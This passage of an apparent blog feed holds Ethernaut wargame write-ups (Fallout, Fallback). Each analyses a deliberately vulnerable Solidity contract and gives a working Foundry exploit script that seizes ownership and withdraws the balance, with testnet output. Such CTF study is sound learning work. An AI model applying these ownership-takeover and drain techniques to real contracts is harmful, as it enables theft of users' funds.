            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership of the contract below</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallout</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">allocations</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"cm\">/* constructor */</span>    <span class=\"k\">function</span> <span class=\"n\">Fal1out</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocate</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">sendAllocation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">allocator</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">collectAllocations</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocatorBalance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors\">Solidity 0.6.0 Documentation - constructors</a></p><blockquote>  <p>üí° Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.</p></blockquote><p>For some reason, the intended <code class=\"language-plaintext highlighter-rouge\">constructor</code> code was written as <code class=\"language-plaintext highlighter-rouge\">Fal1out()</code>, preventing it from acting as a <code class=\"language-plaintext highlighter-rouge\">constructor</code> and allowing external access, which enables claiming <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallout.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallout</span> <span class=\"k\">public</span> <span class=\"n\">fallout_</span> <span class=\"o\">=</span> <span class=\"n\">Fallout</span><span class=\"p\">(</span><span class=\"mh\">0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">Fal1out</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FalloutSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used <span class=\"k\">for </span>script: 62992Estimated amount required: 0.000000132001373792 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH <span class=\"o\">(</span>45606 gas <span class=\"k\">*</span> 0.002095519 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallout",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallback",
            "title": "[Ethernaut] Fallback",
            "summary": null,
            "content_text": "AnalysisThe goals are  claim ownership of the contract  reduce its balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}To satisfy condition 2, go through the withdraw() function but access is impossible due to onlyOwner() modifier.However, looking receive() function, it seems that by increasingly the contribution value to more 0 through the contribute() function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.Exploitsrc/Fallback.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}script/FallbackSol.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Fallback.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallback public fallback_ = Fallback(payable(0x0662008C4CEE1F808C3ca3800404a2BA704952eD));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallback_.contribute{value: 1 wei}();        console.log(\"My contribution: \", fallback_.getContribution());        address(fallback_).call{value: 1 wei}(\"\");        console.log(\"Contract owner: \", fallback_.owner());        fallback_.withdraw();        vm.stopBroadcast();    }}$ forge script script/FallbackSol.sol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used for script: 147280Estimated amount required: 0.00000028924952504 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH (28302 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH (47965 gas * 0.001963936 gwei)##### holesky‚úÖ  [Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH (30364 gas * 0.001963936 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>claim ownership of the contract</li>  <li>reduce its balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To satisfy condition 2, go through the <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function but access is impossible due to <code class=\"language-plaintext highlighter-rouge\">onlyOwner()</code> modifier.</p><p>However, looking <code class=\"language-plaintext highlighter-rouge\">receive()</code> function, it seems that by increasingly the <code class=\"language-plaintext highlighter-rouge\">contribution</code> value to more 0 through the <code class=\"language-plaintext highlighter-rouge\">contribute()</code> function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>src/Fallback.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>script/FallbackSol.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallback.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallback</span> <span class=\"k\">public</span> <span class=\"n\">fallback_</span> <span class=\"o\">=</span> <span class=\"n\">Fallback</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x0662008C4CEE1F808C3ca3800404a2BA704952eD</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">contribute</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My contribution: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">getContribution</span><span class=\"p\">());</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">fallback_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FallbackSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used <span class=\"k\">for </span>script: 147280Estimated amount required: 0.00000028924952504 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH <span class=\"o\">(</span>28302 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH <span class=\"o\">(</span>47965 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH <span class=\"o\">(</span>30364 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallback",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            "title": "[Ethernaut] Hello Ethernaut",
            "summary": null,
            "content_text": "Look into the level‚Äôs info method contract.info()  or¬†await contract.info()¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.after transaction called, clik the ‚ÄúSubmit Instance‚Äù button",
